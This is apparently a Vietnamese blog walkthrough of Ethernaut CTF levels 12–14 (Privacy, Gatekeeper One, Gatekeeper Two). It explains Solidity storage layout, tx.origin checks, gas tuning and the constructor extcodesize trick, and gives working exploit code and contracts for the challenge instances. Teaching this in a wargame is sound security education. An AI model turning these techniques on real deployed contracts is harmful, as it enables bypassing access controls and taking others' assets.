[Nerver ending nightmare!](https://www.youtube.com/watch?v=9rHXkMitp3s)

Ethernaut mới gần đây đã cho ra đời thêm những thử thách mới nữa, và nhiệm vụ của chúng ta vẫn chỉ duy nhất là: vượt qua nó.

**The Ethernaut**: https://ethernaut.zeppelin.solutions/

Một vài recommend:

- Sẽ tốt hơn nếu bạn có kiến thức về Blockchain và Smart Contract.
- Sẽ tốt hơn nếu bạn có kiến thức về Solidity và Web3js.
- Sẽ là tốt hơn nếu bạn biết cách sử dụng Remix IDE hoặc Truffle.

# 12. Privacy 　★★★★★★★★

**Nhiệm vụ**: unlock contract là xong.

```js
pragma solidity ^0.4.18;

contract Privacy {

  bool public locked = true;
  uint256 public constant ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  function Privacy(bytes32[3] _data) public {
    data = _data;
  }

  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

## Phân tích

Để giải quyết được bài toán này các bạn phải hiểu được cách mà storage hoạt động trong solidity. Về cơ bản thì phần này khá là dài và rắc rối, nên mình sẽ chỉ nói những phần cơ bản nhất để ta có thể làm được bài này, các bạn có thể đọc kỹ thêm [tại bài viết này của mình](https://viblo.asia/p/storage-trong-ethereum-smart-contract-OeVKByMr5kW)

- Các biến sẽ được gộp lại thành từng slot có độ dài 32 bytes (256 bits), tức 64 ký tự hexa
- Các biến sẽ lần lượt được đưa vào slot, nếu không vừa thì sẽ được đưa sang slot mới
- *Static array* luôn sinh một slot mới, và cũng đưa các phần tử lần lượt vào slot như trên.
- *constant* sẽ không được lưu vào storage

Note: nếu bạn dùng biến có độ dài nhỏ hơn 32 bytes, có thể contract của bạn sẽ tốn nhiều gas hơn! Vì EVM trong ethereum xử lý theo từng block 32 bytes mỗi phép tính, nên nếu có nhiều thành phần nhỏ hơn 32 bytes thì EVM sẽ phải tốn thêm phép tính để giảm size từ 32 bytes về size mà bạn đã định nghĩa.

Nhìn qua các biến của contract:

```js
bool public locked = true;
uint256 public constant ID = block.timestamp;
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(now);
bytes32[3] private data;
```

như trên, ta sẽ có các slot như sau:

- slot 0: locked, flattening, denomination, awkwardness
- slot 1: data[0] (do mỗi thành phần của data đã là 32 bytes rồi)
- slot 2: data[1]
- slot 3: data[2]

vì thế `data[2]` sẽ có index là 3 trong storage của contract.

## Solution

sử dụng hàm `web3.eth.getStorageAt()` để lấy ra `data[2]`

```js
web3.eth.getStorageAt(instance, 3, function (error,result) {alert(result); })
0x637a643557a340c479666c021cd18ee92449d19ff85bd81414bd52b54422cda5
```

- do hàm `unlock` chỉ cần `bytes16` thôi nên ta cắt đi một nửa độ dài đi và submit là xong (hoặc để cả cũng không sao)

```js
// nhớ thay bằng đoạn string mà bạn lấy được bên trên
await contract.unlock("0x637a643557a340c479666c021cd18ee9")
```

- kiểm tra lại tình trạng khoá của contract:

```js
await contract.unlocked()
false
```

- submit && all done!

![](https://images.viblo.asia/6050a15b-0b48-4dd5-83e7-4cb4608a6ba2.png)

## Bình luận

- Các bài liên quan đến **storage** của smart contract luôn rất là rắc rối.
- Các bạn có thể tham khảo thêm về storage của smart contract [tại bài viết này của mình](https://viblo.asia/p/storage-trong-ethereum-smart-contract-OeVKByMr5kW)

# 13. Gatekeeper One 　★★★★★

**Note**: hãy luôn chọn đúng version solidity và tắt chế độ *Enable Optimization* trên Remix, vì với mỗi version số lượng gas tiêu tốn có thể khác nhau. Đây là một kinh nghiệm đau thương của mình khi tốn cả ngày trời debug mà không biết lỗi nằm ở đâu.

**Nhiệm vụ**: vượt qua 3 cánh cổng và thay đổi địa chỉ của cửa vào

```js
pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

## Phân tích & Solution

Ta sẽ phân tích cách vượt qua từng cửa một

### Cửa số 1

```js
modifier gateOne() {
  require(msg.sender != tx.origin);
  _;
}
```

`tx.origin` sẽ là địa chỉ nguồn nơi phát đi giao dịch, là một ai đó, `msg.sender` là địa chỉ gọi tới hàm hiện tại

Có nghĩa là, khi ta gọi trực tiếp một hàm contract thông thường thì `msg.sender` và `tx.origin` là giống nhau, còn nếu ta gọi hàm đó thông qua một contract trung gian thì `tx.origin` vẫn sẽ là ta, nhưng `msg.sender` sẽ là contract trung gian.

Vì thế ta chỉ cần dùng một contract trung gian là có thể vượt qua cửa số 1.

### Cửa số 2

```js
modifier gateTwo() {
  require(msg.gas % 8191 == 0);
  _;
}
```

Đây chính là điều kiện khó nhằn nhất của bài, ta phải có kiến thức về debug contract để vượt qua nó. Trong bài này ta sẽ sử dụng Remix IDE để thực hiện.

Ta chuẩn bị contract trung gian như sau:

```js
contract Backdoor {
  GatekeeperOne gk;

  function Backdoor (address _target) public {
    gk = GatekeeperOne(_target);
  }

  function enter(uint gaslimit, bytes8 key) public {
    gk.enter.gas(gaslimit)(key);
  }
}
```

trong đó _target là địa chỉ instance của bạn.

Ta sẽ switch qua môi trường là `JavaScript VM` và compile lại cả `GateKeeperOne` và `Backdoor` contract để tiến hành debug.

Ta sẽ set cho hàm enterGate2 một số lượng gas đủ lớn là `500000` gas, `_key` thì tuỳ ý vì ta chưa động đến *gateThree*.

![](https://images.viblo.asia/4e1bbd1b-c342-4958-8504-1143f4ce8d91.png)

Ở đây tuy transaction gần như chắc chắn sẽ fail, tuy nhiên từ đó, ta sẽ tiến hành debug và quan sát xem cho đến khi check điều kiện `require(msg.gas % 8191 == 0);` của gate 2 chúng ta đã tốn mất bao nhiêu gas, để theo đó có thể setup số lượng gas chính xác nhất

![](https://images.viblo.asia/fd3a05dd-98de-4d1d-8777-6fe2fbe76315.png)

Ta thấy rằng cho đến bước 61, tức lúc debug chỉ vào `msg.gas`, số lượng gas hiện tại là 499787 gas, step này tốn 2 gas, vậy tổng số lượng gas đã mất là `500000 - 499787 + 2 = 215`

![](https://images.viblo.asia/6f20c9e8-9cc8-4e34-95a8-7ee8343e5b03.png)

Do đó ta chỉ cần điều chỉnh số lượng gas là `215 + 8191*100=819315` là đủ, sở dĩ nhân với 100 để đảm bảo sau khi qua gate 2 ta vẫn còn đủ gas để đi tiếp vào gate 3:

![](https://images.viblo.asia/ffbff01d-cb20-4860-9dd4-fcc7f5a6b4ee.png)

chạy lại, ta thấy vẫn lỗi, tất nhiên rồi vì đã qua gate3 đâu, tuy nhiên nếu bật debug lên thì ta thấy là đã qua gate 2 rồi. Ngon.

### Cửa số 3

Note: hãy switch lại môi trường Ropsten test net trước khi đến với cửa số 3 vì ta sẽ submit thực tế tại đây.

```js
modifier gateThree(bytes8 _gateKey) {
  require(uint32(_gateKey) == uint16(_gateKey));
  require(uint32(_gateKey) != uint64(_gateKey));
  require(uint32(_gateKey) == uint16(tx.origin));
  _;
}
```

Mấy điều kiện khá là loằng ngoằng, haiz, đầu vào là một tham số `_gateKey` có kiểu dữ liệu là bytes8, tức 16 kí tự hexa.

Trước hết ta nhắc lại một lượt các giới hạn số nguyên trong solidity:

- uint16: 0 tới 65535 ($ 2^{16} - 1 $)
- uint32: 0 tới 4294967295 ($ 2^{32} - 1 $)
- uint64: 0 tới 18446744073709551615 ($ 2^{64} - 1 $)

Khi ép kiểu thì nếu số đó lớn hơn giới hạn của kiểu dữ liệu, thì sẽ quay vòng trở lại từ số bé nhất.

Có nghĩa là, giả sử như ta ép kiểu `uint16(x)` thì kết quả ta nhận được sẽ là x % 65536

OK, quay trở lại bài toán, **điều kiện thứ 3**:

```js
require(uint32(_gateKey) == uint16(tx.origin));
```

ở đây `tx.origin` chính là địa chỉ account của mình. Ở đây mình sử dụng địa chỉ của mình, các bạn hãy thay tương ứng với địa chỉ của các bạn.

Do việc tính toán với số lớn của javascript hơi củ chuối, nên mình dùng python để tính toán

Trước tiên ta sẽ tính `uint16(tx.origin)`

```python
>>>int('0xf32fd9e7d64a3b90ce2e5563927eff2567ebd96b', 16) % 2**16
55659
```

Vậy thì từ `require(uint32(_gateKey) == uint16(tx.origin));` ta có `_gateKey` sẽ có dạng $ 2^{32}*x + 55659 $

**Điều kiện đầu tiên**: 

```js
require(uint32(_gateKey) == uint16(_gateKey));
```

Ta thấy rằng với dạng $ 2^{32}*x + 55659 $ thì điều kiện trên rõ ràng luôn đúng vì

$$
(2^{32} \times x + 55659) ~ mod ~ 2^{32} = (2^{32} \times x + 55659) ~ mod ~ 2^{16} = 55659
$$

nghĩa là chỉ cần một số đi quá chu kì của $ 2^{32} $ một lượng nhỏ hơn $ 2^{16} $ là ok

**Điều kiện thứ 2**: 

```js
require(uint32(_gateKey) != uint64(_gateKey));
```

Để đạt được điều kiện này ta chỉ cần một số đi quá giới hạn của `uint32` nhưng chưa tới giới hạn của `uint64`, khi đó số đó sẽ quay trở lại rất nhỏ với `uint32` nhưng vẫn còn rất lớn với `uint64`, thật vậy

$$
(2^{32} + 55659) ~ mod ~ 2^{64} = 4295022955
$$
$$
(2^{32} + 55659) ~ mod ~ 2^{32} = 55659
$$

Vậy nên ta chọn luôn số $ 2^{32} + 55659 $ và chuyển nó qua dạng hex là ok

```python
>>> 2**32 + 55659
4295022955
>>>hex(4295022955)
'0x10000d96b'
```

vì chuỗi key là dạng `bytes8`, tức 16 ký tự hexa, ta sẽ thêm vài số 0 ở đầu để đảm bảo key dài 16 ký tự: `0x000000010000d96b`
thay *key* bằng chuỗi bên trên và submit

![](https://images.viblo.asia/c6bc9c77-b86f-4fff-8484-3ccccb08351f.png)

Kiểm tra lại xem entrant đã đổi thành địa chỉ của mình chưa ?

```js
> await contract.entrant()
"0xf32fd9e7d64a3b90ce2e5563927eff2567ebd96b"
```

Submit && All done!

![](https://images.viblo.asia/6050a15b-0b48-4dd5-83e7-4cb4608a6ba2.png)

## Bình luận

Đây là một bài tập hết sức khó nhằn, yêu cầu rất nhiều kiến thức tổng hợp. Từ kiến thức về msg.sender, tx.origin, cho đến overflow dữ liệu, đồng thời phải biết cả debug transaction, hiểu về khái niệm *gas* trong giao dịch. Thực sự mình đánh giá đây là bài tập khó nhất của chuỗi CTF này.

Không hiểu sao phía BTC họ lại để 5/6 sao, chắc trêu :joy:

# 14. Gatekeeper Two 　★★★★★★

**Nhiệm vụ**: vượt qua 3 cánh cổng khác và thay đổi địa chỉ của cửa vào

```js
pragma solidity ^0.4.18;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

## Phân tích & Solution

Ta sẽ phân tích cách vượt qua từng cửa một giống như bài GatekeeperOne.

### Cửa số 1

```js
modifier gateOne() {
  require(msg.sender != tx.origin);
  _;
}
```

`tx.origin` sẽ là địa chỉ nguồn nơi phát đi giao dịch, là một ai đó, `msg.sender` là địa chỉ gọi tới hàm hiện tại

Có nghĩa là, khi ta gọi trực tiếp một hàm contract thông thường thì `msg.sender` và `tx.origin` là giống nhau, còn nếu ta gọi hàm đó thông qua một contract trung gian thì `tx.origin` vẫn sẽ là ta, nhưng `msg.sender` sẽ là contract trung gian.

Vì thế ta chỉ cần dùng một contract trung gian là có thể vượt qua cửa số 1.

### Cửa số 2

```js
modifier gateTwo() {
  uint x;
  assembly { x := extcodesize(caller) }
  require(x == 0);
  _;
}
```

`extcodesize(caller)` chính là lấy ra lượng code chứa trong `caller` gọi đến contract `GatekeeperTwo` này. `caller` có thể là người (account thông thường), cũng có thể là contract.

một điều kiện quan trọng ở đây chính là `require(x == 0)`, có nghĩa là `caller` không có tí code nào ? hay caller chỉ có thể là người. Điều này chẳng phải đã phủ nhận điều kiện ở gate 1 rồi hay sao ? làm thế nào để ta có thể qua được 2 cửa cùng một lúc được ?

Đó chính là lúc ta cần đến `yellow paper` - tài liệu đặc tả kỹ thuật của ethereum, trong đó có đoạn:

> During initialization code execution, EXTCODESIZE on the address should return zero, which is the length of the code of the account while
CODESIZE should return the length of the initialization cod

có nghĩa là trong contract thì trong constructor codesize vẫn là 0, chỉ sau khi hoàn thành constructor thì codesize mới có giá trị.

Điều này gợi ý ta vượt qua gate 2 bằng cách gọi hàm enter ngay trong constructor của contract tấn công, nó vừa đảm bảo ta dùng contract trung gian, lại vừa đảm bảo `codesize == 0`. Yeah!

### Cửa số 3

```js
modifier gateThree(bytes8 _gateKey) {
  require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
  _;
}
```

điều kiện này rất là dễ, chỉ đơn thuần là một phép *XOR* mà thôi. Ta biết rằng nếu `a XOR b = c` thì `b = a XOR c`, một tính chất rất cơ bản của *XOR*. Do đó:

```js
uint64(_gateKey) = uint64(keccak256(msg.sender)) ^ (uint64(0) - 1)
```

có một điều lưu ý ở đây, do chúng ta sử dụng contract trung gian để tấn công, vì thế địa chỉ `msg.sender` ở đây chính là địa chỉ của contract trung gian, nên trong code của contract trung gian, ta phải thay thế `msg.sender` bằng `address(this)`

Cuối cùng code của contract tấn công sẽ như sau:

```js
contract Backdoor {
  function Backdoor (address _target) public {
    GatekeeperTwo(_target).enter(bytes8((uint64(uint64(keccak256(address(this)))^(uint64(0) - 1)))));
  }
}
```

đơn giản phải không. Paste lên Remix, compile với địa chỉ `_target` là địa chỉ instance của bạn.

![](https://images.viblo.asia/7398286b-058d-411e-9f58-1dbdfcc1e0cf.png)

Kiểm tra lại xem entrant đã đổi thành địa chỉ của mình chưa ?

```js
> await contract.entrant()
"0xf32fd9e7d64a3b90ce2e5563927eff2567ebd96b"
```

Submit && All done!

![](https://images.viblo.asia/6050a15b-0b48-4dd5-83e7-4cb4608a6ba2.png)

## Bình luận

Đây là một bài tập theo kiểu dạng "biết thì rất dễ, không biết thì không biết đằng nào mà lần". Phần `assembly { x := extcodesize(caller) }` thực sự là một trick rất khó nhằn.

**Enjoy Coding!**